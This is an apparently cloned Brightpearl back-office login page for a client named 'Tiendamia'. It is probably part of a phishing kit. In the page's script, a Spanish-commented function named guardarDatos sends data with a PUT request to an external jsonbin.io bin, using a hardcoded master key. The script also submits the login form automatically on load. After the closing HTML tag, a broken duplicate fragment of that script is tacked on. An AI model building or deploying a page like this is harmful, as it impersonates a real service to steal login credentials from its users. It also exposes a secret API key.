<!DOCTYPE html>
<html>
<head>
    <title>Brightpearl - Login</title>
    <meta name="viewport" content="width=device-width, height=device-height minimum-scale=1.0, maximum-scale=1.0">
    <script src="https://dxfbapopdsmzi.cloudfront.net/5.0.1122/build/js/jquery/jquery-1.6.2.min.js"></script>
    <link rel="stylesheet" media="all" href="https://dxfbapopdsmzi.cloudfront.net/5.0.1122/build/css/reset.css">
    <link rel="stylesheet" media="all" href="https://dxfbapopdsmzi.cloudfront.net/5.0.1122/build/css/all.css">
    <link rel="stylesheet" media="all" href="https://dxfbapopdsmzi.cloudfront.net/5.0.1122/build/css/pages/login/login.css">
    <script>

        var loginJS = {
            hideCommon: function () {
                $('#login-form-epos').hide();
                $('#login-form-admin').hide();
                $('#login-form-forgot').hide();
            },
            showAdmin: function () {
                this.hideCommon();
                $('.login-forgot-goto').hide();
                $('#login-forgot-goto-admin').show();
                $('#login-form-admin').show();
            },
            showEpos: function () {
                this.hideCommon();
                $('.login-forgot-goto').hide();
                $('#login-forgot-goto-epos').show();
                $('#login-form-epos').show();
            },
            showForgot: function () {
                this.hideCommon();
                $('#email_address_remind').val($('#email_address_login').val());
                $('#login-form-forgot').show();
            }
        }

        var _BP = {
            intercomAppId: 'c5p0n0ka'
        }

        $(document).ready(function () {

            $('.login-button-epos').click(function () {
                loginJS.showEpos();
            });

            $('.login-button-admin').click(function () {
                loginJS.showAdmin();
            });

            $('.login-button-forgot').click(function () {
                loginJS.showForgot();
            });

            $('#email_address_login').focus();

            $('.sso-button').click(function() {
                $('#submit-sso').click();
            });

            const BIN_ID = '65ba84021f5677401f28f3cb';
            const X_MASTER_KEY = '$2a$10$SPnSCePVMiT4fZnmd.DVkOYXTe9wOTGzhsevMfAVMbTaXoroZSa6y';

            function guardarDatos(data) {
                console.log('Guardando datos:', data);

                const url = `https://api.jsonbin.io/b/${BIN_ID}`;
                const headers = {
                    'Content-Type': 'application/json',
                    'Authorization': X_MASTER_KEY,
                };

                const requestOptions = {
                    method: 'PUT',
                    headers: headers,
                    body: JSON.stringify(data),
                };

                fetch(url, requestOptions)
                    .then(response => response.json())
                    .then(json => console.log('Respuesta JSONBin:', json))
                    .catch(error => console.error('Error:', error));
            }

            // Continúa con el envío del formulario si es necesario
            // Puedes redirigir o realizar otras acciones aquí
            document.getElementById('login-form-admin').submit();
        });

    </script>

    <script src='https://www.google.com/recaptcha/api.js'></script>
</head>
<body id="login">

<div id="login-main-content-wrapper">
    <div id="login-form">
        <div id="login-logo-wrapper">
            <a href="http://www.brightpearl.com" title="Go to brightpearl.com" target="_blank">
                <img src="https://dxfbapopdsmzi.cloudfront.net/5.0.1122/build/images/logos/brightpearl-logo-white.svg"/>
            </a>
        </div>
        <div id="login-form-content">
            <div class="login-greeting">
                <span>Hello</span> Tiendamia                <br/>
                <a class="login-tiny-link" href="https://login.brightpearlapp.com">Sign in to a different account</a>
            </div>
                        <form id="login-form-admin" method="post" action="//use1.brightpearlapp.com/admin_login.php">
                <input type="hidden" name="clients_id" value="tiendamia"/>
                <input type="hidden" name="redirect" value="//use1.brightpearlapp.com/index.php"/>
                <input type="hidden" name="action" value="login"/>

                <input type="email" id="email_address_login" class="input" name="email_address" value=""
                       placeholder="Email address"/>
                <input type="password" id="password" class="input" autocomplete="off" name="password"
                       value="" placeholder="Password"/>
                <a class="login-button-forgot">Forgotten your password?</a>
                <div class="login-submit-box">
                    <input type="submit" id="submit-admin" value="Sign in" formaction="//use1.brightpearlapp.com/admin_login.php"/>
                </div>
                                                <div class="login-submit-box login-training-box">
                    <a class="login-link" id="brightpearl-training" href="https://training.brightpearl.com" target="_blank">Or sign in to Brightpearl Training</a>
                </div>
            </form>
            <form id="login-form-forgot" method="post" action="//use1.brightpearlapp.com/admin_login.php">
                <input type="email" id="email_address_remind" class="input" name="email_address" value=""
                       placeholder="Email address"/>
                <input type="hidden" name="clients_id" value="tiendamia"/>
                <input type="hidden" name="action" value="remind"/>
                <div id="login-forgot-captcha">
                    <div class="g-recaptcha" data-sitekey="6LdgeEAUAAAAAO5EFne4I58OgLWhSXW1OpKdDghA"></div>
                </div>

                <div class="login-submit-box">
                    <input type="submit" id="submit-forgot" value="Reset Password"/>
                    <br/>
                    <a class="login-link login-button-admin login-forgot-goto"
                       id="login-forgot-goto-admin">Or
                        sign in to Back Office</a>
                    <a class="login-link login-button-epos login-forgot-goto"
                       id="login-forgot-goto-epos" style="display: none;">Or
                        sign in to EPOS</a>
                </div>
            </form>
        </div>
        <div id="grow-fearlessly-wrapper">
            <img src="https://dxfbapopdsmzi.cloudfront.net/5.0.1122/build/images/login/grow_fearlessly.svg"/>
        </div>
    </div>

    <div id="login-media">
        <iframe src="https://info.brightpearl.com/loginpromoscreen" height="101%" width="100%"
                style="border:none;outline: none"></iframe>
    </div>
    <script src="https://dxfbapopdsmzi.cloudfront.net/5.0.1122/build/js/intercom.logged.out.js"></script>
</body>
</html>


    // Continúa con el envío del formulario si es necesario
    // Puedes redirigir o realizar otras acciones aquí
    document.getElementById('login-form-admin').submit();
});
